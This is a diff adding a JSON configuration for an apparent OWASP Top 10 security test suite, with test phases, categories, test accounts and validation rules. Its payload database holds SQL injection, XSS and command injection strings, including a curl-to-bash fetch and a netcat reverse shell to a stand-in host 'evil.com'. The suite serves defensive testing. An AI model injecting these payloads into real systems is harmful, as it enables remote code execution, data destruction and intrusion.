@@ -1,0 +1,240 @@
+{
+  "testSuite": {
+    "name": "BetterPrompts Security Test Suite",
+    "version": "1.0.0",
+    "description": "Comprehensive security testing based on OWASP Top 10",
+    "compliance": ["OWASP_Top_10_2021", "PCI_DSS_4.0", "SOC2_Type_II"],
+    "phases": [
+      {
+        "phase": "preparation",
+        "steps": [
+          "Setup test environment",
+          "Create test users and data",
+          "Configure security scanners",
+          "Prepare attack payloads"
+        ]
+      },
+      {
+        "phase": "reconnaissance",
+        "steps": [
+          "Service enumeration",
+          "Technology stack identification",
+          "Entry point mapping",
+          "Authentication flow analysis"
+        ]
+      },
+      {
+        "phase": "vulnerability_assessment",
+        "steps": [
+          "Automated vulnerability scanning",
+          "Manual security testing",
+          "Business logic testing",
+          "Authentication and session testing"
+        ]
+      },
+      {
+        "phase": "exploitation",
+        "steps": [
+          "Controlled exploitation attempts",
+          "Privilege escalation testing",
+          "Data exfiltration simulation",
+          "Lateral movement assessment"
+        ]
+      },
+      {
+        "phase": "reporting",
+        "steps": [
+          "Vulnerability documentation",
+          "Risk assessment",
+          "Remediation recommendations",
+          "Executive summary generation"
+        ]
+      }
+    ]
+  },
+  "testCategories": {
+    "A01_2021_Broken_Access_Control": {
+      "tests": [
+        "Bypass access control checks",
+        "Force browsing to authenticated pages",
+        "Privilege escalation attempts",
+        "CORS misconfiguration",
+        "JWT manipulation"
+      ],
+      "priority": "critical"
+    },
+    "A02_2021_Cryptographic_Failures": {
+      "tests": [
+        "Weak encryption algorithms",
+        "Insecure data transmission",
+        "Weak password storage",
+        "Missing encryption at rest",
+        "Key management issues"
+      ],
+      "priority": "critical"
+    },
+    "A03_2021_Injection": {
+      "tests": [
+        "SQL injection",
+        "NoSQL injection",
+        "Command injection",
+        "LDAP injection",
+        "XPath injection",
+        "XXE injection"
+      ],
+      "priority": "critical"
+    },
+    "A04_2021_Insecure_Design": {
+      "tests": [
+        "Business logic flaws",
+        "Race conditions",
+        "Time-of-check to time-of-use",
+        "Insufficient anti-automation"
+      ],
+      "priority": "high"
+    },
+    "A05_2021_Security_Misconfiguration": {
+      "tests": [
+        "Default configurations",
+        "Unnecessary features enabled",
+        "Missing security headers",
+        "Verbose error messages",
+        "Outdated software"
+      ],
+      "priority": "high"
+    },
+    "A06_2021_Vulnerable_Components": {
+      "tests": [
+        "Known vulnerable dependencies",
+        "Outdated libraries",
+        "Unpatched systems",
+        "Component version disclosure"
+      ],
+      "priority": "high"
+    },
+    "A07_2021_Authentication_Failures": {
+      "tests": [
+        "Brute force attacks",
+        "Weak password policy",
+        "Session fixation",
+        "Missing MFA",
+        "Timing attacks"
+      ],
+      "priority": "critical"
+    },
+    "A08_2021_Software_Data_Integrity": {
+      "tests": [
+        "Insecure deserialization",
+        "Unsigned firmware",
+        "CI/CD pipeline security",
+        "Code integrity checks"
+      ],
+      "priority": "high"
+    },
+    "A09_2021_Security_Logging_Failures": {
+      "tests": [
+        "Insufficient logging",
+        "Log injection",
+        "Missing security events",
+        "Unprotected log files"
+      ],
+      "priority": "medium"
+    },
+    "A10_2021_SSRF": {
+      "tests": [
+        "Server-side request forgery",
+        "URL validation bypass",
+        "Internal service exposure",
+        "Cloud metadata access"
+      ],
+      "priority": "high"
+    }
+  },
+  "testConfiguration": {
+    "environment": {
+      "baseUrl": "http://localhost:3000",
+      "apiUrl": "http://localhost/api/v1",
+      "timeout": 30000,
+      "retries": 2
+    },
+    "authentication": {
+      "users": [
+        {
+          "role": "regular",
+          "email": "security_test_user@betterprompts.ai",
+          "password": "SecureTest123!"
+        },
+        {
+          "role": "admin",
+          "email": "security_test_admin@betterprompts.ai",
+          "password": "AdminSecure123!"
+        },
+        {
+          "role": "attacker",
+          "email": "attacker@evil.com",
+          "password": "HackAttempt123!"
+        }
+      ]
+    },
+    "scanning": {
+      "parallelScans": 3,
+      "requestsPerSecond": 10,
+      "scanDepth": 5,
+      "followRedirects": true,
+      "userAgent": "BetterPrompts-Security-Scanner/1.0"
+    },
+    "reporting": {
+      "formats": ["html", "json", "pdf"],
+      "includeEvidence": true,
+      "includeRemediation": true,
+      "severityThreshold": "medium"
+    }
+  },
+  "payloadDatabase": {
+    "sql_injection": {
+      "basic": ["' OR '1'='1", "'; DROP TABLE users; --"],
+      "advanced": ["' UNION SELECT NULL--", "' AND 1=CAST(0x5F21403264696C656D6D61 AS INT)--"],
+      "blind": ["' AND SLEEP(5)--", "' AND 1=(SELECT COUNT(*) FROM users)--"]
+    },
+    "xss": {
+      "basic": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"],
+      "advanced": ["<svg/onload=alert(1)>", "javascript:alert(1)"],
+      "encoded": ["%3Cscript%3Ealert(1)%3C/script%3E", "&#60;script&#62;alert(1)&#60;/script&#62;"]
+    },
+    "command_injection": {
+      "basic": ["; ls -la", "| whoami", "`id`"],
+      "advanced": ["$(curl evil.com/shell.sh|bash)", "; nc -e /bin/sh evil.com 4444"]
+    }
+  },
+  "validationRules": {
+    "critical_findings": {
+      "maxAllowed": 0,
+      "action": "block_deployment"
+    },
+    "high_findings": {
+      "maxAllowed": 0,
+      "action": "require_approval"
+    },
+    "medium_findings": {
+      "maxAllowed": 5,
+      "action": "warn"
+    },
+    "security_headers": {
+      "required": [
+        "Strict-Transport-Security",
+        "X-Content-Type-Options",
+        "X-Frame-Options",
+        "Content-Security-Policy",
+        "X-XSS-Protection",
+        "Referrer-Policy"
+      ]
+    },
+    "tls_configuration": {
+      "minVersion": "TLS1.2",
+      "cipherSuites": [
+        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
+      ]
+    }
+  }
+}
